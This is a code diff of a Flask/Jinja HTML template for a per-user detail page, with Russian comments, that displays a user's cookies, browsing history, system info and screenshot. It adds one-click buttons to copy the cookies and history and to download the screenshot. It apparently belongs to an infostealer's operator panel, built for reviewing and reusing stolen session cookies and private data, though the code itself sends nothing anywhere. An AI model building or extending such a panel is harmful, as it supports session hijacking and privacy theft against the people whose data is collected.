@@ -2,37 +2,38 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>User Detail</title>
+<title>User {{ user.username }} Details</title>
 <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-<header>User {{ user[1] }} Details</header>
+<header>User {{ user.username }} Details</header>
 <div class="container">
     <div class="user-card">
-        <p><strong>ID:</strong> {{ user[0] }}</p>
-        <p><strong>Username:</strong> {{ user[1] }}</p>
-        <p><strong>Timestamp:</strong> {{ user[6] }}</p>
+        <p><strong>ID:</strong> {{ user.id }}</p>
+        <p><strong>Username:</strong> {{ user.username }}</p>
+        <p><strong>Timestamp:</strong> {{ user.timestamp }}</p>
 
         <h3>Cookies</h3>
-        <div class="json-box">{{ user[2] }}</div>
-        <button class="action-btn" onclick="copyText({{ user[2]|tojson }})">Copy Cookies</button>
+        <div class="json-box">{{ user.cookies | tojson(indent=2) }}</div>
+        <button class="action-btn" onclick="copyText({{ user.cookies | tojson | safe }})">Copy Cookies</button>
 
         <h3>History</h3>
-        <div class="json-box">{{ user[3] }}</div>
-        <button class="action-btn" onclick="copyText({{ user[3]|tojson }})">Copy History</button>
+        <div class="json-box">{{ user.history | tojson(indent=2) }}</div>
+        <button class="action-btn" onclick="copyText({{ user.history | tojson | safe }})">Copy History</button>
 
         <h3>System Info</h3>
-        <div class="json-box">{{ user[4] }}</div>
-        <button class="action-btn" onclick="copyText({{ user[4]|tojson }})">Copy System Info</button>
+        <div class="json-box">{{ user.system_info | tojson(indent=2) }}</div>
+        <button class="action-btn" onclick="copyText({{ user.system_info | tojson | safe }})">Copy System Info</button>
 
-        {% if user[5] %}
+        {% if user.screenshot %}
         <h3>Screenshot</h3>
-        <img src="data:image/png;base64,{{ user[5]|b64encode }}" class="screenshot" id="screenshot">
-        <button class="action-btn" onclick="downloadImage('{{ user[5]|b64encode }}', 'screenshot.png')">Download Screenshot</button>
+        <img src="data:image/png;base64,{{ user.screenshot | b64encode }}" class="screenshot" id="screenshot">
+        <button class="action-btn" onclick="downloadImage('{{ user.screenshot | b64encode }}', 'screenshot.png')">Download Screenshot</button>
         {% endif %}
     </div>
 </div>
 
+<!-- Modal -->
 <div id="modal" class="modal">
   <span class="close-modal">&times;</span>
   <img class="modal-content" id="modal-img">
@@ -44,21 +45,25 @@ const img = document.getElementById("screenshot");
 const modalImg = document.getElementById("modal-img");
 const span = document.getElementsByClassName("close-modal")[0];
 
+// Скриншот в модалку
 if(img){
     img.onclick = function(){
         modal.style.display = "block";
         modalImg.src = this.src;
     }
 }
+
+// Закрытие модалки
 span.onclick = function() { modal.style.display = "none"; }
 window.onclick = function(event) { if(event.target == modal){ modal.style.display = "none"; } }
 
-function copyText(text){
-    navigator.clipboard.writeText(
-        typeof text === "string" ? text : JSON.stringify(text, null, 2)
-    ).then(()=>alert("Copied to clipboard!"));
+// Копирование текста
+function copyText(obj){
+    const text = JSON.stringify(obj, null, 2);
+    navigator.clipboard.writeText(text).then(()=>alert("Copied to clipboard!"));
 }
 
+// Скачивание скриншота
 function downloadImage(base64, filename){
     const link = document.createElement('a');
     link.href = "data:image/png;base64," + base64;
